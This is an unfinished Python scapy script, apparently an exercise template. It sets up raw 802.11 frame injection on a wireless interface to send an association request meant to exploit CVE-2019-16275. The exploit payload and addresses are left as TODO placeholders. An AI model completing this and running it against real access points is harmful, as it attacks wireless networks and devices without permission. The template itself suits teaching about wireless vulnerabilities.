from scapy.all import *

# Configure your interface.
IFACE = "wlan0" # TODO: REPLACE ME.

if __name__ == "__main__":

	# Configure the Socket.
	L2socket = conf.L2socket
	sock = L2socket( type=ETH_P_ALL , iface=IFACE )
	
	print("[+] Configured socket on interface {}.".format(IFACE))
	
	# TODO: Craft the frame exploiting CVE-2019-16275.
	frame = Dot11(type=0,subtype=0)/Dot11AssoReq()/Raw("GROUP=TODO")
	frame[Dot11].addr1 = None # Destination Address.
	frame[Dot11].addr2 = None # Source Address.
	frame[Dot11].addr3 = None # BSSID.
	
	print("[+] Crafted the following frame:")
	frame.show()

	# Transmit the frame.
	# NOTE: Make sure your interface is configured in
	# monitor mode on the appropriate channel.
	sock.send( RadioTap()/frame )
	
	print("[?] Injected...")
	